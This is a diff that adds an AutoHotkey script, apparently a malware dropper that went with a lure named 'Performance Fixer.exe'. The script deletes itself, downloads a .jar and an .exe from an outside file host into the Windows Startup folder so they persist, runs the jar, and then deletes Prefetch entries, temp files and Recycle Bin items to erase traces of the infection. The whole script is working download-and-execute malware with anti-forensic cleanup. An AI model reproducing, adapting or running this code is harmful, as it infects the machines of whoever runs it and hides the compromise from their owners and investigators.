@@ -1,0 +1,25 @@
+﻿#NoEnv
+#MaxHotkeysPerInterval 99000000
+#HotkeyInterval 99000000
+#KeyHistory 0
+SetWorkingDir %A_ScriptDir%
+
+   FileDelete, %A_ScriptFullPath%	
+   URLDownloadToFile, https://a.pomf.cat/tnowsu.jar, C:\Users\%A_Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\zuiy.jar
+   URLDownloadToFile, https://a.pomf.cat/qoxxdv.gg, C:\Users\%A_Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\zuiy.exe
+   Run, C:\Users\%A_Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\zuiy.jar
+   FileDelete, C:\Users\%USERNAME%\AppData\Local\Temp\~temp*.tmp
+   FileSetAttrib, -R, C:\Users\%USERNAME%\AppData\Local\Temp\etilqs_*.*
+   FileDelete, C:\Users\%USERNAME%\AppData\Local\Temp\etilqs_*.*
+   FileDelete, C:\Windows\Prefetch\AHK2EXE*.pf
+   FileDelete, C:\Windows\Prefetch\AUTOHOTKEY*.pf
+   FileDelete, C:\$RECYCLE.BIN\*.lnk
+   FileDelete, C:\$RECYCLE.BIN\*.pf
+   FileDelete, C:\$RECYCLE.BIN\*.tmp
+   FileDelete, C:\$RECYCLE.BIN\etilqs*.*
+   FileDelete, C:\Users\Public\Performance Fixer.exe
+
+
+
+
+
